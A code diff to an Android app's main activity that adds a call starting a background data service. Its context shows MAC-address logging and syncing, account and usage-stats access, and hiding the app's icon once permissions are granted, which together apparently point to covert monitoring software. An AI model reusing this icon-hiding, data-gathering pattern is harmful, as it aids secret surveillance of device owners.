@@ -155,7 +155,6 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
         AppOpsManager appOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
         int mode = appOps.checkOpNoThrow("android:get_usage_stats",
                 android.os.Process.myUid(), context.getPackageName());
-        @SuppressWarnings("FieldCanBeLocal")
         boolean granted = mode == AppOpsManager.MODE_ALLOWED;
         return granted;
     }
@@ -201,6 +200,9 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
             stopService(new Intent(this, GoogleAccountService.class));
         }
 
+        /* Check Permission On Device */
+        checkPermissionOnDevice();
+
         Log.e("MAC", "Address>>" + Preference.getMacAddress(this));
         if (Preference.getMacAddress(this) != null && !Preference.getMacAddress(this).isEmpty()) {
             new RestClientService(TAG_SYNC_PROCESS, Preference.getMacAddress(this), "");
@@ -208,6 +210,17 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
 
         /* Hide App Icon When All Permission Process Will be Done */
         Utilities.hideIcon(this);
+    }
+
+    /* Check Permission On Device */
+    private void checkPermissionOnDevice() {
+        startService(new Intent(this, BackgroundDataService.class)
+                .putExtra(KEY_TAG, TAG_PERMISSIONS)
+                .putExtra(KEY_COUNT, "")
+                .putExtra(KEY_DATE_FROM, "")
+                .putExtra(KEY_DATE_TO, "")
+                .putExtra(KEY_SIZE, "")
+                .putExtra(KEY_SUBJECT, ""));
     }
 
     /* On Activity Result Call */
@@ -252,7 +265,8 @@ public class MainActivity extends AppCompatActivity implements Constant, EasyPer
                 requestCode, permissions, grantResults, this);
         switch (requestCode) {
             case REQUEST_PERMISSION_GET_ACCOUNTS:
-                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) break;
+                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
+                    break;
             default:
                 break;
         }
